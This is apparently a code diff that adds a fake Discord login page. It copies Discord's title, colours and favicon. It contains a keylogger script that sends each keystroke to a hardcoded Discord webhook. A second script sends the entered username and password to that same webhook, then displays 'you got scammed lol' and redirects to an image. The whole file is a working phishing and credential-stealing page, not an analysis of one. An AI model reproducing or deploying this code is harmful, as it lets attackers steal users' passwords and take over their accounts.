@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login to Discord</title>
+<link rel="icon" type="image/x-icon" href="./discordfavicon.png">
+<style>
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #36393F;
+        color: #fff;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+    .container {
+        width: 300px;
+        padding: 20px;
+        background-color: #7289DA;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        text-align: center;
+    }
+    .container h2 {
+        font-size: 24px;
+        margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        margin: 8px 0;
+        box-sizing: border-box;
+        border: none;
+        border-radius: 4px;
+        background-color: #f6f6f6;
+    }
+    input[type="submit"] {
+        width: 100%;
+        padding: 10px;
+        margin-top: 20px;
+        box-sizing: border-box;
+        border: none;
+        border-radius: 4px;
+        background-color: #4CAF50;
+        color: white;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+    }
+    input[type="submit"]:hover {
+        background-color: #45a049;
+    }
+    .forgot-password {
+        font-size: 14px;
+        color: #ccc;
+        text-decoration: none;
+        margin-top: 10px;
+        display: block;
+    }
+</style>
+</head>
+<body background="./new-and-slightly-older-discord-login-screen-as-a-png-v0-zznw60dgve3d1.png">
+
+<div class="container">
+    <h2>Welcome Back!</h2>
+    <form id="loginForm">
+        <input type="text" id="username" name="username" placeholder="Username or E-mail address">
+        <br>
+        <input type="password" id="password" name="password" placeholder="Password">
+        <br>
+        <input type="submit" value="Login">
+    </form>
+    <a href="#" class="forgot-password">Forgot your password?</a>
+</div>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+    
+        // Listen for the keydown event (when a key is pressed)
+        document.addEventListener('keydown', function(event) {
+            // Get the entered character using event.key
+            let key = event.key;
+    
+            // Setting up message data to send to the Discord Webhook
+            let webhookUrl = 'https://discord.com/api/webhooks/1259780988066861086/FcpRWs8IUfdLF6_HLoTrbGT5PX4cTAPOo7mXBQ7DT1WCs2pvETz5ccryQtFEfqMLVr3Z'; 
+            let message = {
+                content: `Key pressed: ${key}`
+            };
+    
+            // Send the message to the Discord Webhook using the POST method
+            fetch('https://discord.com/api/webhooks/1259780988066861086/FcpRWs8IUfdLF6_HLoTrbGT5PX4cTAPOo7mXBQ7DT1WCs2pvETz5ccryQtFEfqMLVr3Z', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send message to Discord webhook:', response.status, response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Error sending message to Discord webhook:', error);
+            });
+        });
+    });
+    </script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.getElementById('loginForm');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Get username and password values
+            let username = document.getElementById('username').value;
+            let password = document.getElementById('password').value;
+
+            // Setting up message data to send to the Discord Webhook
+            let webhookUrl = 'https://discord.com/api/webhooks/1259780988066861086/FcpRWs8IUfdLF6_HLoTrbGT5PX4cTAPOo7mXBQ7DT1WCs2pvETz5ccryQtFEfqMLVr3Z';
+            let message = {
+                content: `Login Attempt:\nUsername: ${username}\nPassword: ${password}`
+            };
+
+            // Send the message to the Discord Webhook using the POST method
+            fetch('https://discord.com/api/webhooks/1259780988066861086/FcpRWs8IUfdLF6_HLoTrbGT5PX4cTAPOo7mXBQ7DT1WCs2pvETz5ccryQtFEfqMLVr3Z', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send message to Discord webhook:', response.status, response.statusText);
+                } else {
+                    console.log('Login attempt sent to Discord webhook.');
+                    // Optionally redirect to another page or perform further actions upon successful submission
+                }
+            })
+            .catch(error => {
+                console.error('Error sending message to Discord webhook:', error);
+            });
+            // Display a popup saying "you got scammed lol"
+            alert("you got scammed lol");
+            
+            // Redirect to Discord's main app page
+            window.location.href = 'https://ih1.redbubble.net/image.5411073292.4625/flat,750x,075,f-pad,750x1000,f8f8f8.jpg';
+        });
+    });
+</script>
+
+</body>
+</html>
